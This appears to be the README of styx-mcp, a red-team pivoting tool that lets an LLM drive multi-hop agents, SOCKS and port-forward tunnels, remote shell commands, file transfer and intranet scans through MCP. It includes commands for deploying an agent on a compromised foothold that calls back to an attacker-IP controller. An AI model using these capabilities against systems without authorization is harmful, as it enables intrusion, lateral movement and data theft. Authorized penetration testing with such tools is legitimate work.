<p align="center">
  <img src="docs/images/logo.png" alt="styx-mcp" width="520">
</p>

<p align="center">
  <a href="LICENSE"><img src="https://img.shields.io/badge/License-MIT-blue.svg" alt="License: MIT"></a>
  <a href="https://go.dev/"><img src="https://img.shields.io/badge/Go-1.21+-00ADD8?logo=go&logoColor=white" alt="Go"></a>
  <a href="https://modelcontextprotocol.io/"><img src="https://img.shields.io/badge/MCP-stdio-black" alt="MCP"></a>
  <a href="https://github.com/N0va-7/styx-mcp/stargazers"><img src="https://img.shields.io/github/stars/N0va-7/styx-mcp?style=social" alt="GitHub stars"></a>
</p>

<p align="center"><strong>English</strong> · <a href="README_ZH.md">简体中文</a></p>

> Orchestrate multi-hop nodes, tunnels, and intranet recon via **MCP tools**

<p align="center">
  <img src="docs/images/architecture.png" alt="styx-mcp architecture: LLM and local tools via controller to multi-hop agents" width="920">
</p>

## Disclaimer

> **Authorized use only.** Use only on systems you own or have explicit written permission to test (labs, CTF / exam ranges, RoE-covered engagements). Unauthorized use is illegal. You are solely responsible for how you use this software.

**Please read this README (especially [SOCKS vs forward vs backward vs scan](#socks-vs-forward-vs-backward-vs-scan)) before use.**

## Features

- Tree topology: active (`-c`) / passive (`-l`), multi-hop pivots
- Mutual **HMAC** preauth + optional **TLS**
- **SOCKS5** on the controller — local tools exit via a chosen node
- Per-stream **byte-window flow control** (controller/agent must match)
- **Forward** (listen on agent) & **backward** (listen on controller)
- **Async `start_cmd`** — one-shot remote command (`task_id`)
- **Async `start_scan`** — discover → port scan → light fingerprint + **refs**
- **Async `pull_file`** / `upload_file`
- Async tasks + `get_task_status` (phases + `result.progress` for long scans)
- Cross-compile: Linux / Windows / macOS (`make build-all`)

## Table of contents

- [Quick start](#quick-start)
- [Cursor MCP setup](#cursor-mcp-setup)
- [MCP tools](#mcp-tools)
- [Intranet scan (`start_scan`)](#intranet-scan-start_scan)
- [Examples](#examples)
- [CLI flags](#cli-flags)
- [Security notes](#security-notes)
- [Project layout](#project-layout)
- [Acknowledgments](#acknowledgments)
- [License](#license)

## Quick start

```bash
git clone https://github.com/N0va-7/styx-mcp.git
cd styx-mcp
make build          # → release/<os>-<arch>/
```

```bash
# Terminal A — controller (keeps stdio for MCP; for CLI smoke only)
./release/$(uname -s | tr A-Z a-z)-$(uname -m | sed 's/x86_64/amd64/;s/aarch64/arm64/')/controller \
  -s change-me -l 127.0.0.1:19137

# Terminal B — agent
./release/.../agent -s change-me -c 127.0.0.1:19137
```

Prefer **Cursor**? Skip terminal A and use the [wrapper](#cursor-mcp-setup) below, then only start the agent.

```bash
make build-all   # linux-amd64 / windows-amd64 / darwin-arm64
make test
```

## Cursor MCP setup

1. `make build` so `release/<os>-<arch>/controller` exists.
2. `~/.cursor/mcp.json` (or project `.cursor/mcp.json`):

```json
{
  "mcpServers": {
    "styx-mcp": {
      "command": "/absolute/path/to/styx-mcp/scripts/styx-mcp-wrapper.sh",
      "env": {
        "STYX_SECRET": "change-me-to-a-strong-secret",
        "STYX_LISTEN": "127.0.0.1:19137",
        "STYX_LOG": "/tmp/styx-mcp-controller.log"
      }
    }
  }
}
```

3. Cursor → **Settings → MCP** → enable / refresh **styx-mcp**.
4. On the foothold:

```bash
./agent -s change-me -c <controller-ip>:19137
```

| Env | Default | Meaning |
| :--- | :--- | :--- |
| `STYX_SECRET` | *(required)* | Shared secret (`-s`) |
| `STYX_LISTEN` | `127.0.0.1:19137` | Agent listen addr on controller |
| `STYX_LOG` | `/tmp/styx-mcp-controller.log` | Controller log |
| `STYX_MCP_LOG` | *(unset)* | Optional raw MCP stdio log path |
| `STYX_BIN_DIR` | `release/<os>-<arch>` | Binary directory override |

Never commit real secrets into public configs.

## MCP tools

| Tool | What it does | Listen / act where |
| :--- | :--- | :--- |
| `list_nodes` | Topology | — |
| `get_node_detail` | Detail | — |
| `add_node_memo` / `delete_node_memo` | Memos | — |
| `start_listener` | Wait for child agents | **Agent** |
| `connect_node` | Dial a child | **Agent** |
| `start_socks` | SOCKS5 for local tools | **Controller** → exit via node |
| `start_forward` | Port forward | **Agent** listen → target |
| `start_backward` | Reverse forward | **Controller** → via node → target |
| `upload_file` | Upload | Controller → agent |
| `pull_file` | Pull file to controller | Agent → controller path |
| `start_cmd` | One-shot remote command | Agent `sh -c` (async `task_id`) |
| `start_scan` | Intranet port scan + light fingerprint | **Agent** (async `task_id`) |
| `get_task_status` | Poll async work | — |
| `shutdown_node` | Kill node | — |

Long-running calls return `task_id` → poll with `get_task_status`.

### SOCKS vs forward vs backward vs scan

| You want… | Use |
| :--- | :--- |
| `curl` / scanners on the **controller host** into an internal net | `start_socks` |
| One **controller** port → one internal `ip:port` | `start_backward` |
| A port **on the foothold** that dials elsewhere | `start_forward` |
| Structured open ports / fingerprints **from the agent** | `start_scan` |

<p align="center">
  <img src="docs/images/traffic-modes.png" alt="When to use start_socks, start_backward, start_forward, start_scan" width="920">
</p>

## Intranet scan (`start_scan`)

Runs on the selected **agent** (traffic exits that host).

<p align="center">
  <img src="docs/images/scan-pipeline.png" alt="start_scan pipeline: discover, port scan, fingerprint, refs" width="920">
</p>

**Discover (hybrid, default on):** host is alive if **ICMP succeeds OR** any TCP probe port is open.  
If zero hosts are alive, the job **falls back** to scanning all targets and sets `warnings` (avoids a silent empty result).

**Port method:** `auto` (default) uses **SYN** when the agent has raw IPv4 TCP (root / CAP_NET_RAW on Linux), otherwise **TCP connect**. Force with `method=connect` or `method=syn`.

| Arg | Default | Notes |
| :--- | :--- | :--- |
| `node_id` | required | Exit via this agent |
| `targets` | required | IPv4 IP / CIDR / comma list |
| `mode` | `fast` | `fast` \| `normal` \| `full` \| `custom` (`full` is expensive) |
| `ports` | — | Required for `custom` (`22,80,8000-8100`) |
| `fingerprint` | `true` | Fingerprint open ports only |
| `discover` | `true` | Hybrid alive probe first |
| `method` | `auto` | `auto` \| `connect` \| `syn` |
| `concurrency` | `200` | Max 500 |
| `timeout_ms` | `500` | Per-probe timeout |

**Phases** (via `get_task_status`): `discovering` → `scanning` → `fingerprinting` → `done`.  
While discovering, `result.progress` may include `stage`, `icmp_done` / `icmp_total`, `icmp_alive`, `alive_n`, `tcp_probes`.

**Rebuild note:** controller and agent must be built from the **same commit** after protocol changes (SCAN\*).

Lab helper (authorized ranges only; uses port **19139** so it does not steal MCP’s `:19137`):

```bash
STYX_SECRET=… STYX_CALLBACK=<attacker-ip> ./scripts/lab-scan-e2e.sh
```

## Examples

<details open>
<summary><strong>SOCKS5</strong></summary>

```json
{ "name": "start_socks", "arguments": { "node_id": 0, "address": "127.0.0.1:10801" } }
```

```bash
curl --socks5-hostname 127.0.0.1:10801 http://<internal-host>/
export ALL_PROXY=socks5h://127.0.0.1:10801
```

</details>

<details>
<summary><strong>Two-level topology</strong></summary>

```bash
./agent -s change-me -l 127.0.0.1:19138   # child, passive
```

```json
{ "name": "connect_node", "arguments": { "node_id": 0, "address": "127.0.0.1:19138" } }
```

</details>

<details>
<summary><strong>Forward / backward / upload</strong></summary>

```json
{
  "name": "start_forward",
  "arguments": {
    "node_id": 0,
    "listen_address": "127.0.0.1:19141",
    "target_address": "10.0.0.5:80"
  }
}
```

Connect to `listen_address` **on the agent host**.

```json
{
  "name": "start_backward",
  "arguments": {
    "node_id": 0,
    "local_address": "127.0.0.1:19142",
    "target_address": "10.0.0.5:80"
  }
}
```

Connect to `127.0.0.1:19142` **on the controller host**.

```json
{
  "name": "upload_file",
  "arguments": {
    "node_id": 0,
    "local_path": "/path/to/tool",
    "remote_path": "/tmp/tool"
  }
}
```

</details>

<details>
<summary><strong>Intranet scan</strong></summary>

```json
{
  "name": "start_scan",
  "arguments": {
    "node_id": 0,
    "targets": "172.16.23.0/24",
    "mode": "fast",
    "discover": true,
    "method": "auto",
    "fingerprint": true
  }
}
```

```json
{ "name": "get_task_status", "arguments": { "task_id": "start_scan-1" } }
```

Useful result fields: `stats`, `open[]`, `summary.interesting[]`, optional `warnings[]` / `refs`.

</details>

## CLI flags

<details>
<summary><strong>controller</strong></summary>

| Flag | Description |
| :--- | :--- |
| `-s` | Shared secret |
| `-l` | Listen for agents `[ip]:port` |
| `-c` | Optional active connect |
| `-down` | `raw` only (`ws` rejected) |
| `-tls-enable` | TLS on node links |
| `-domain` | TLS SNI / WS domain |
| `-heartbeat` | Heartbeat to first node |
| `-reconnect-max` | Max active (`-c`) dial attempts (default `3`; `0` = single try) |

</details>

<details>
<summary><strong>agent</strong></summary>

| Flag | Description |
| :--- | :--- |
| `-s` | Shared secret |
| `-c` | Connect to parent / controller |
| `-l` | Passive listen |
| `-up` / `-down` | `raw` only (`ws` rejected) |
| `-tls-enable` / `-domain` | TLS |
| `-reconnect` | Base delay seconds after unexpected drop (default `10`; `0` = off) |
| `-reconnect-max` | Max reconnect attempts after drop (default `3`) |
| `-socks5-proxy` / `-socks5-proxyu` / `-socks5-proxyp` | Reach parent via SOCKS5 |
| `-http-proxy` | Reach parent via HTTP proxy |

</details>

Controller and agents must share the **same secret** (and matching TLS/WS options). After reconnect/reonline handshake changes, rebuild **both** binaries from the same commit.

## Security notes

- Treat `-s` / `STYX_SECRET` like a password; rotate after shared labs. The wrapper **requires** `STYX_SECRET` (no weak default).
- Payload encryption uses **HKDF-SHA256** derived AES-256-GCM keys (controller and agents must run matching versions).
- Optional TLS (`-tls-enable`) derives a stable cert from the shared secret and verifies peers (still use a strong secret).
- Default wrapper listen is `127.0.0.1:19137`; set `STYX_LISTEN=0.0.0.0:…` only for remote agents.
- Bind SOCKS to `127.0.0.1` unless you intentionally expose it.
- Upload paths allow absolute destinations but reject `..`; max single-file transfer is 32 MiB.
- MCP stdio logging is **off** by default; set `STYX_MCP_LOG=/path` only when debugging (may contain secrets).
- Rebuild controller **and** agent from the same commit after protocol changes.

## Project layout

```text
cmd/controller/     controller + MCP entrypoint
cmd/agent/          agent entrypoint
scripts/            MCP wrapper, lab-scan-e2e.sh, lab_scan_smoke.go
pkg/controller/     control plane, SOCKS / backward / scan tasks
pkg/mcp/            MCP tools
pkg/node/           agent handlers (incl. scan job)
pkg/scan/           targets, discover, connect/SYN port check
pkg/fingerprint/    light fingerprint + vuln ref table
pkg/protocol/       wire protocol
pkg/share/preauth/  HMAC mutual preauth
```

## Acknowledgments

- [Stowaway](https://github.com/ph4ntonn/Stowaway)
- [fscan](https://github.com/shadow1ng/fscan)
- [mcp-go](https://github.com/mark3labs/mcp-go)

## License

[MIT](LICENSE)
